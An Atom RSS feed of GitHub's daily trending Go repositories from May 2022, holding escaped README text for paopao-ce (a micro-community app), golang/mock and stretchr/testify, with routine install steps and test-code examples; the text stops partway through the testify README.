<?xml version="1.0" encoding="UTF-8"?><feed xmlns="http://www.w3.org/2005/Atom">
  <title>GitHub Go Daily Trending</title>
  <id>http://mshibanami.github.io/GitHubTrendingRSS</id>
  <updated>2022-05-29T01:42:16Z</updated>
  <subtitle>Daily Trending of Go in GitHub</subtitle>
  <link href="http://mshibanami.github.io/GitHubTrendingRSS"></link>
  <entry>
    <title>rocboss/paopao-ce</title>
    <updated>2022-05-29T01:42:16Z</updated>
    <id>tag:github.com,2022-05-29:/rocboss/paopao-ce</id>
    <link href="https://github.com/rocboss/paopao-ce" rel="alternate"></link>
    <summary type="html">&lt;p&gt;🔥A artistic &#34;twitter like&#34; community built on gin+zinc+vue+ts 清新文艺微社区&lt;/p&gt;&lt;hr&gt;&lt;div id=&#34;top&#34;&gt;&lt;/div&gt; &#xA;&lt;!-- PROJECT SHIELDS --&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://goreportcard.com/report/github.com/rocboss/paopao-ce&#34;&gt;&lt;img src=&#34;https://goreportcard.com/badge/github.com/rocboss/paopao-ce&#34; alt=&#34;Go Report Card&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/rocboss/paopao-ce/network/members&#34;&gt;&lt;img src=&#34;https://img.shields.io/github/forks/rocboss/paopao-ce?style=flat&#34; alt=&#34;Forks&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/rocboss/paopao-ce/stargazers&#34;&gt;&lt;img src=&#34;https://img.shields.io/github/stars/rocboss/paopao-ce.svg?style=flat&#34; alt=&#34;Stargazers&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/rocboss/paopao-ce/raw/master/LICENSE.txt&#34;&gt;&lt;img src=&#34;https://img.shields.io/github/license/rocboss/paopao-ce.svg?style=flat&#34; alt=&#34;MIT License&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/rocboss/paopao-ce/graphs/contributors&#34;&gt;&lt;img src=&#34;https://img.shields.io/github/contributors/rocboss/paopao-ce?style=flat&#34; alt=&#34;Contributors&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/rocboss/paopao-ce/issues&#34;&gt;&lt;img src=&#34;https://img.shields.io/github/issues/rocboss/paopao-ce.svg?style=flat&#34; alt=&#34;Issues&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;!-- PROJECT LOGO --&gt; &#xA;&lt;div align=&#34;center&#34;&gt; &#xA; &lt;a href=&#34;https://github.com/rocboss/paopao-ce&#34;&gt; &lt;img src=&#34;https://cdn.rocs.me/static/paopao-logo.png&#34; alt=&#34;Logo&#34; width=&#34;80&#34; height=&#34;80&#34;&gt; &lt;/a&gt; &#xA; &lt;h3 align=&#34;center&#34;&gt;PaoPao&lt;/h3&gt; &#xA; &lt;p align=&#34;center&#34;&gt; 🔥一个清新文艺的微社区 &lt;br&gt; &lt;a href=&#34;https://www.paopao.info/&#34;&gt;View Demo&lt;/a&gt; · &lt;a href=&#34;https://github.com/rocboss/paopao-ce/issues&#34;&gt;Report Bug&lt;/a&gt; · &lt;a href=&#34;https://www.rocs.me/archives/paopao.html&#34;&gt;Features&lt;/a&gt; &lt;/p&gt; &#xA;&lt;/div&gt; &#xA;&lt;h2&gt;1. 截图预览&lt;/h2&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://www.paopao.info&#34;&gt;&lt;img src=&#34;https://cdn.rocs.me/static/paopao-light.jpeg&#34; alt=&#34;明色主题&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://www.paopao.info&#34;&gt;&lt;img src=&#34;https://cdn.rocs.me/static/paopao-dark.jpeg&#34; alt=&#34;暗色主题&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;更多演示请前往&lt;a href=&#34;https://www.paopao.info&#34;&gt;官网&lt;/a&gt;体验（谢绝灌水）&lt;/p&gt; &#xA;&lt;p align=&#34;right&#34;&gt;(&lt;a href=&#34;https://raw.githubusercontent.com/rocboss/paopao-ce/main/#top&#34;&gt;back to top&lt;/a&gt;)&lt;/p&gt; &#xA;&lt;!-- GETTING STARTED --&gt; &#xA;&lt;h2&gt;2. 快速开始&lt;/h2&gt; &#xA;&lt;h3&gt;2.1 技术栈&lt;/h3&gt; &#xA;&lt;p&gt;PaoPao主要由以下优秀的开源项目/工具构建&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://go.dev/&#34;&gt;Go&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://gin-gonic.com/&#34;&gt;Gin&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://zinclabs.io/&#34;&gt;Zinc&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.naiveui.com/&#34;&gt;Naive UI&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://vuejs.org/&#34;&gt;Vue.js&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://vitejs.dev/&#34;&gt;Vite.js&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;2.2 环境要求&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Go (1.17+)&lt;/li&gt; &#xA; &lt;li&gt;Node.js (14+)&lt;/li&gt; &#xA; &lt;li&gt;MySQL (5.7+)&lt;/li&gt; &#xA; &lt;li&gt;Redis&lt;/li&gt; &#xA; &lt;li&gt;Zinc&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;* Zinc是一款轻量级全文搜索引擎，可以查阅 &lt;a href=&#34;https://zincsearch.com/&#34;&gt;https://zincsearch.com/&lt;/a&gt; 安装&lt;/p&gt; &#xA;&lt;p&gt;以上环境版本为PaoPao官方的开发版本，仅供参考，其他版本的环境未进行充分测试&lt;/p&gt; &#xA;&lt;br&gt; &#xA;&lt;h3&gt;3. 安装说明&lt;/h3&gt; &#xA;&lt;p&gt;克隆代码库&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git clone https://github.com/rocboss/paopao-ce.git&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;3.1 后端&lt;/h4&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;导入项目根目录下的 &lt;code&gt;paopao.sql&lt;/code&gt; 文件至MySQL数据库&lt;/li&gt; &#xA; &lt;li&gt;拷贝项目根目录下 &lt;code&gt;config.yaml.sample&lt;/code&gt; 文件至 &lt;code&gt;config.yaml&lt;/code&gt;，按照注释完成配置编辑&lt;/li&gt; &#xA; &lt;li&gt;编译后端 &lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;go mod download&#xA;go build .&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;li&gt;启动后端 &lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;chmod +x paopao-api&#xA;./paopao-api&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;h4&gt;3.2 前端&lt;/h4&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt; &lt;p&gt;进入前端目录 &lt;code&gt;web&lt;/code&gt;，编辑 &lt;code&gt;.env&lt;/code&gt; 文件中后端服务地址，下载依赖包&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;cd ./web&#xA;vim .env&#xA;yarn&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;编译前端&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;yarn build&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;p&gt;build完成后，可以在dist目录获取编译产出，配置nginx指向至该目录即可&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;h4&gt;3.3 其他&lt;/h4&gt; &#xA;&lt;p&gt;建议后端服务使用 &lt;code&gt;supervisor&lt;/code&gt; 守护进程，并通过nginx反向代理后，提供API给前端服务调用。 短信通道使用的juhe数据，如果申请不下来，可以考虑替换其他服务商。 代码结构比较简单，喜欢的朋友欢迎给个Star、贡献PR。&lt;/p&gt; &#xA;&lt;!-- MARKDOWN LINKS &amp; IMAGES --&gt;</summary>
  </entry>
  <entry>
    <title>golang/mock</title>
    <updated>2022-05-29T01:42:16Z</updated>
    <id>tag:github.com,2022-05-29:/golang/mock</id>
    <link href="https://github.com/golang/mock" rel="alternate"></link>
    <summary type="html">&lt;p&gt;GoMock is a mocking framework for the Go programming language.&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;gomock&lt;/h1&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/golang/mock/actions&#34;&gt;&lt;img src=&#34;https://github.com/golang/mock/actions/workflows/test.yaml/badge.svg?sanitize=true&#34; alt=&#34;Build Status&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://pkg.go.dev/github.com/golang/mock&#34;&gt;&lt;img src=&#34;https://pkg.go.dev/badge/github.com/golang/mock.svg?sanitize=true&#34; alt=&#34;Go Reference&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;gomock is a mocking framework for the &lt;a href=&#34;http://golang.org/&#34;&gt;Go programming language&lt;/a&gt;. It integrates well with Go&#39;s built-in &lt;code&gt;testing&lt;/code&gt; package, but can be used in other contexts too.&lt;/p&gt; &#xA;&lt;h2&gt;Installation&lt;/h2&gt; &#xA;&lt;p&gt;Once you have &lt;a href=&#34;http://golang.org/doc/install.html#releases&#34;&gt;installed Go&lt;/a&gt;, install the &lt;code&gt;mockgen&lt;/code&gt; tool.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Note&lt;/strong&gt;: If you have not done so already be sure to add &lt;code&gt;$GOPATH/bin&lt;/code&gt; to your &lt;code&gt;PATH&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;p&gt;To get the latest released version use:&lt;/p&gt; &#xA;&lt;h3&gt;Go version &amp;lt; 1.16&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;GO111MODULE=on go get github.com/golang/mock/mockgen@v1.6.0&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Go 1.16+&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;go install github.com/golang/mock/mockgen@v1.6.0&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;If you use &lt;code&gt;mockgen&lt;/code&gt; in your CI pipeline, it may be more appropriate to fixate on a specific mockgen version. You should try to keep the library in sync with the version of mockgen used to generate your mocks.&lt;/p&gt; &#xA;&lt;h2&gt;Running mockgen&lt;/h2&gt; &#xA;&lt;p&gt;&lt;code&gt;mockgen&lt;/code&gt; has two modes of operation: source and reflect.&lt;/p&gt; &#xA;&lt;h3&gt;Source mode&lt;/h3&gt; &#xA;&lt;p&gt;Source mode generates mock interfaces from a source file. It is enabled by using the -source flag. Other flags that may be useful in this mode are -imports and -aux_files.&lt;/p&gt; &#xA;&lt;p&gt;Example:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;mockgen -source=foo.go [other options]&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Reflect mode&lt;/h3&gt; &#xA;&lt;p&gt;Reflect mode generates mock interfaces by building a program that uses reflection to understand interfaces. It is enabled by passing two non-flag arguments: an import path, and a comma-separated list of symbols.&lt;/p&gt; &#xA;&lt;p&gt;You can use &#34;.&#34; to refer to the current path&#39;s package.&lt;/p&gt; &#xA;&lt;p&gt;Example:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;mockgen database/sql/driver Conn,Driver&#xA;&#xA;# Convenient for `go:generate`.&#xA;mockgen . Conn,Driver&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Flags&lt;/h3&gt; &#xA;&lt;p&gt;The &lt;code&gt;mockgen&lt;/code&gt; command is used to generate source code for a mock class given a Go source file containing interfaces to be mocked. It supports the following flags:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;code&gt;-source&lt;/code&gt;: A file containing interfaces to be mocked.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;code&gt;-destination&lt;/code&gt;: A file to which to write the resulting source code. If you don&#39;t set this, the code is printed to standard output.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;code&gt;-package&lt;/code&gt;: The package to use for the resulting mock class source code. If you don&#39;t set this, the package name is &lt;code&gt;mock_&lt;/code&gt; concatenated with the package of the input file.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;code&gt;-imports&lt;/code&gt;: A list of explicit imports that should be used in the resulting source code, specified as a comma-separated list of elements of the form &lt;code&gt;foo=bar/baz&lt;/code&gt;, where &lt;code&gt;bar/baz&lt;/code&gt; is the package being imported and &lt;code&gt;foo&lt;/code&gt; is the identifier to use for the package in the generated source code.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;code&gt;-aux_files&lt;/code&gt;: A list of additional files that should be consulted to resolve e.g. embedded interfaces defined in a different file. This is specified as a comma-separated list of elements of the form &lt;code&gt;foo=bar/baz.go&lt;/code&gt;, where &lt;code&gt;bar/baz.go&lt;/code&gt; is the source file and &lt;code&gt;foo&lt;/code&gt; is the package name of that file used by the -source file.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;code&gt;-build_flags&lt;/code&gt;: (reflect mode only) Flags passed verbatim to &lt;code&gt;go build&lt;/code&gt;.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;code&gt;-mock_names&lt;/code&gt;: A list of custom names for generated mocks. This is specified as a comma-separated list of elements of the form &lt;code&gt;Repository=MockSensorRepository,Endpoint=MockSensorEndpoint&lt;/code&gt;, where &lt;code&gt;Repository&lt;/code&gt; is the interface name and &lt;code&gt;MockSensorRepository&lt;/code&gt; is the desired mock name (mock factory method and mock recorder will be named after the mock). If one of the interfaces has no custom name specified, then default naming convention will be used.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;code&gt;-self_package&lt;/code&gt;: The full package import path for the generated code. The purpose of this flag is to prevent import cycles in the generated code by trying to include its own package. This can happen if the mock&#39;s package is set to one of its inputs (usually the main one) and the output is stdio so mockgen cannot detect the final output package. Setting this flag will then tell mockgen which import to exclude.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;code&gt;-copyright_file&lt;/code&gt;: Copyright file used to add copyright header to the resulting source code.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;code&gt;-debug_parser&lt;/code&gt;: Print out parser results only.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;code&gt;-exec_only&lt;/code&gt;: (reflect mode) If set, execute this reflection program.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;code&gt;-prog_only&lt;/code&gt;: (reflect mode) Only generate the reflection program; write it to stdout and exit.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;code&gt;-write_package_comment&lt;/code&gt;: Writes package documentation comment (godoc) if true. (default true)&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;For an example of the use of &lt;code&gt;mockgen&lt;/code&gt;, see the &lt;code&gt;sample/&lt;/code&gt; directory. In simple cases, you will need only the &lt;code&gt;-source&lt;/code&gt; flag.&lt;/p&gt; &#xA;&lt;h2&gt;Building Mocks&lt;/h2&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;type Foo interface {&#xA;  Bar(x int) int&#xA;}&#xA;&#xA;func SUT(f Foo) {&#xA; // ...&#xA;}&#xA;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;func TestFoo(t *testing.T) {&#xA;  ctrl := gomock.NewController(t)&#xA;&#xA;  // Assert that Bar() is invoked.&#xA;  defer ctrl.Finish()&#xA;&#xA;  m := NewMockFoo(ctrl)&#xA;&#xA;  // Asserts that the first and only call to Bar() is passed 99.&#xA;  // Anything else will fail.&#xA;  m.&#xA;    EXPECT().&#xA;    Bar(gomock.Eq(99)).&#xA;    Return(101)&#xA;&#xA;  SUT(m)&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;If you are using a Go version of 1.14+, a mockgen version of 1.5.0+, and are passing a *testing.T into &lt;code&gt;gomock.NewController(t)&lt;/code&gt; you no longer need to call &lt;code&gt;ctrl.Finish()&lt;/code&gt; explicitly. It will be called for you automatically from a self registered &lt;a href=&#34;https://pkg.go.dev/testing?tab=doc#T.Cleanup&#34;&gt;Cleanup&lt;/a&gt; function.&lt;/p&gt; &#xA;&lt;h2&gt;Building Stubs&lt;/h2&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;type Foo interface {&#xA;  Bar(x int) int&#xA;}&#xA;&#xA;func SUT(f Foo) {&#xA; // ...&#xA;}&#xA;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;func TestFoo(t *testing.T) {&#xA;  ctrl := gomock.NewController(t)&#xA;  defer ctrl.Finish()&#xA;&#xA;  m := NewMockFoo(ctrl)&#xA;&#xA;  // Does not make any assertions. Executes the anonymous functions and returns&#xA;  // its result when Bar is invoked with 99.&#xA;  m.&#xA;    EXPECT().&#xA;    Bar(gomock.Eq(99)).&#xA;    DoAndReturn(func(_ int) int {&#xA;      time.Sleep(1*time.Second)&#xA;      return 101&#xA;    }).&#xA;    AnyTimes()&#xA;&#xA;  // Does not make any assertions. Returns 103 when Bar is invoked with 101.&#xA;  m.&#xA;    EXPECT().&#xA;    Bar(gomock.Eq(101)).&#xA;    Return(103).&#xA;    AnyTimes()&#xA;&#xA;  SUT(m)&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Modifying Failure Messages&lt;/h2&gt; &#xA;&lt;p&gt;When a matcher reports a failure, it prints the received (&lt;code&gt;Got&lt;/code&gt;) vs the expected (&lt;code&gt;Want&lt;/code&gt;) value.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;Got: [3]&#xA;Want: is equal to 2&#xA;Expected call at user_test.go:33 doesn&#39;t match the argument at index 1.&#xA;Got: [0 1 1 2 3]&#xA;Want: is equal to 1&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Modifying &lt;code&gt;Want&lt;/code&gt;&lt;/h3&gt; &#xA;&lt;p&gt;The &lt;code&gt;Want&lt;/code&gt; value comes from the matcher&#39;s &lt;code&gt;String()&lt;/code&gt; method. If the matcher&#39;s default output doesn&#39;t meet your needs, then it can be modified as follows:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;gomock.WantFormatter(&#xA;  gomock.StringerFunc(func() string { return &#34;is equal to fifteen&#34; }),&#xA;  gomock.Eq(15),&#xA;)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;This modifies the &lt;code&gt;gomock.Eq(15)&lt;/code&gt; matcher&#39;s output for &lt;code&gt;Want:&lt;/code&gt; from &lt;code&gt;is equal to 15&lt;/code&gt; to &lt;code&gt;is equal to fifteen&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;h3&gt;Modifying &lt;code&gt;Got&lt;/code&gt;&lt;/h3&gt; &#xA;&lt;p&gt;The &lt;code&gt;Got&lt;/code&gt; value comes from the object&#39;s &lt;code&gt;String()&lt;/code&gt; method if it is available. In some cases the output of an object is difficult to read (e.g., &lt;code&gt;[]byte&lt;/code&gt;) and it would be helpful for the test to print it differently. The following modifies how the &lt;code&gt;Got&lt;/code&gt; value is formatted:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;gomock.GotFormatterAdapter(&#xA;  gomock.GotFormatterFunc(func(i interface{}) string {&#xA;    // Leading 0s&#xA;    return fmt.Sprintf(&#34;%02d&#34;, i)&#xA;  }),&#xA;  gomock.Eq(15),&#xA;)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;If the received value is &lt;code&gt;3&lt;/code&gt;, then it will be printed as &lt;code&gt;03&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Debugging Errors&lt;/h2&gt; &#xA;&lt;h3&gt;reflect vendoring error&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;cannot find package &#34;.&#34;&#xA;... github.com/golang/mock/mockgen/model&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;If you come across this error while using reflect mode and vendoring dependencies there are three workarounds you can choose from:&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;Use source mode.&lt;/li&gt; &#xA; &lt;li&gt;Include an empty import &lt;code&gt;import _ &#34;github.com/golang/mock/mockgen/model&#34;&lt;/code&gt;.&lt;/li&gt; &#xA; &lt;li&gt;Add &lt;code&gt;--build_flags=--mod=mod&lt;/code&gt; to your mockgen command.&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;p&gt;This error is due to changes in default behavior of the &lt;code&gt;go&lt;/code&gt; command in more recent versions. More details can be found in &lt;a href=&#34;https://github.com/golang/mock/issues/494&#34;&gt;#494&lt;/a&gt;.&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>stretchr/testify</title>
    <updated>2022-05-29T01:42:16Z</updated>
    <id>tag:github.com,2022-05-29:/stretchr/testify</id>
    <link href="https://github.com/stretchr/testify" rel="alternate"></link>
    <summary type="html">&lt;p&gt;A toolkit with common assertions and mocks that plays nicely with the standard library&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Testify - Thou Shalt Write Tests&lt;/h1&gt; &#xA;&lt;p&gt;ℹ️ We are working on testify v2 and would love to hear what you&#39;d like to see in it, have your say here: &lt;a href=&#34;https://cutt.ly/testify&#34;&gt;https://cutt.ly/testify&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://travis-ci.org/stretchr/testify&#34;&gt;&lt;img src=&#34;https://travis-ci.org/stretchr/testify.svg?sanitize=true&#34; alt=&#34;Build Status&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://goreportcard.com/report/github.com/stretchr/testify&#34;&gt;&lt;img src=&#34;https://goreportcard.com/badge/github.com/stretchr/testify&#34; alt=&#34;Go Report Card&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://pkg.go.dev/github.com/stretchr/testify&#34;&gt;&lt;img src=&#34;https://pkg.go.dev/badge/github.com/stretchr/testify&#34; alt=&#34;PkgGoDev&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;Go code (golang) set of packages that provide many tools for testifying that your code will behave as you intend.&lt;/p&gt; &#xA;&lt;p&gt;Features include:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/stretchr/testify/master/#assert-package&#34;&gt;Easy assertions&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/stretchr/testify/master/#mock-package&#34;&gt;Mocking&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/stretchr/testify/master/#suite-package&#34;&gt;Testing suite interfaces and functions&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Get started:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Install testify with &lt;a href=&#34;https://raw.githubusercontent.com/stretchr/testify/master/#installation&#34;&gt;one line of code&lt;/a&gt;, or &lt;a href=&#34;https://raw.githubusercontent.com/stretchr/testify/master/#staying-up-to-date&#34;&gt;update it with another&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;For an introduction to writing test code in Go, see &lt;a href=&#34;http://golang.org/doc/code.html#Testing&#34;&gt;http://golang.org/doc/code.html#Testing&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Check out the API Documentation &lt;a href=&#34;http://godoc.org/github.com/stretchr/testify&#34;&gt;http://godoc.org/github.com/stretchr/testify&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;To make your testing life easier, check out our other project, &lt;a href=&#34;http://github.com/stretchr/gorc&#34;&gt;gorc&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;A little about &lt;a href=&#34;http://en.wikipedia.org/wiki/Test-driven_development&#34;&gt;Test-Driven Development (TDD)&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;&lt;a href=&#34;http://godoc.org/github.com/stretchr/testify/assert&#34; title=&#34;API documentation&#34;&gt;&lt;code&gt;assert&lt;/code&gt;&lt;/a&gt; package&lt;/h2&gt; &#xA;&lt;p&gt;The &lt;code&gt;assert&lt;/code&gt; package provides some helpful methods that allow you to write better test code in Go.&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Prints friendly, easy to read failure descriptions&lt;/li&gt; &#xA; &lt;li&gt;Allows for very readable code&lt;/li&gt; &#xA; &lt;li&gt;Optionally annotate each assertion with a message&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;See it in action:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;package yours&#xA;&#xA;import (&#xA;  &#34;testing&#34;&#xA;  &#34;github.com/stretchr/testify/assert&#34;&#xA;)&#xA;&#xA;func TestSomething(t *testing.T) {&#xA;&#xA;  // assert equality&#xA;  assert.Equal(t, 123, 123, &#34;they should be equal&#34;)&#xA;&#xA;  // assert inequality&#xA;  assert.NotEqual(t, 123, 456, &#34;they should not be equal&#34;)&#xA;&#xA;  // assert for nil (good for errors)&#xA;  assert.Nil(t, object)&#xA;&#xA;  // assert for not nil (good when you expect something)&#xA;  if assert.NotNil(t, object) {&#xA;&#xA;    // now we know that object isn&#39;t nil, we are safe to make&#xA;    // further assertions without causing any errors&#xA;    assert.Equal(t, &#34;Something&#34;, object.Value)&#xA;&#xA;  }&#xA;&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Every assert func takes the &lt;code&gt;testing.T&lt;/code&gt; object as the first argument. This is how it writes the errors out through the normal &lt;code&gt;go test&lt;/code&gt; capabilities.&lt;/li&gt; &#xA; &lt;li&gt;Every assert func returns a bool indicating whether the assertion was successful or not, this is useful for if you want to go on making further assertions under certain conditions.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;if you assert many times, use the below:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;package yours&#xA;&#xA;import (&#xA;  &#34;testing&#34;&#xA;  &#34;github.com/stretchr/testify/assert&#34;&#xA;)&#xA;&#xA;func TestSomething(t *testing.T) {&#xA;  assert := assert.New(t)&#xA;&#xA;  // assert equality&#xA;  assert.Equal(123, 123, &#34;they should be equal&#34;)&#xA;&#xA;  // assert inequality&#xA;  assert.NotEqual(123, 456, &#34;they should not be equal&#34;)&#xA;&#xA;  // assert for nil (good for errors)&#xA;  assert.Nil(object)&#xA;&#xA;  // assert for not nil (good when you expect something)&#xA;  if assert.NotNil(object) {&#xA;&#xA;    // now we know that object isn&#39;t nil, we are safe to make&#xA;    // further assertions without causing any errors&#xA;    assert.Equal(&#34;Something&#34;, object.Value)&#xA;  }&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;&lt;a href=&#34;http://godoc.org/github.com/stretchr/testify/require&#34; title=&#34;API documentation&#34;&gt;&lt;code&gt;require&lt;/code&gt;&lt;/a&gt; package&lt;/h2&gt; &#xA;&lt;p&gt;The &lt;code&gt;require&lt;/code&gt; package provides same global functions as the &lt;code&gt;assert&lt;/code&gt; package, but instead of returning a boolean result they terminate current test.&lt;/p&gt; &#xA;&lt;p&gt;See &lt;a href=&#34;http://golang.org/pkg/testing/#T.FailNow&#34;&gt;t.FailNow&lt;/a&gt; for details.&lt;/p&gt; &#xA;&lt;h2&gt;&lt;a href=&#34;http://godoc.org/github.com/stretchr/testify/mock&#34; title=&#34;API documentation&#34;&gt;&lt;code&gt;mock&lt;/code&gt;&lt;/a&gt; package&lt;/h2&gt; &#xA;&lt;p&gt;The &lt;code&gt;mock&lt;/code&gt; package provides a mechanism for easily writing mock objects that can be used in place of real objects when writing test code.&lt;/p&gt; &#xA;&lt;p&gt;An example test function that tests a piece of code that relies on an external object &lt;code&gt;testObj&lt;/code&gt;, can setup expectations (testify) and assert that they indeed happened:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;package yours&#xA;&#xA;import (&#xA;  &#34;testing&#34;&#xA;  &#34;github.com/stretchr/testify/mock&#34;&#xA;)&#xA;&#xA;/*&#xA;  Test objects&#xA;*/&#xA;&#xA;// MyMockedObject is a mocked 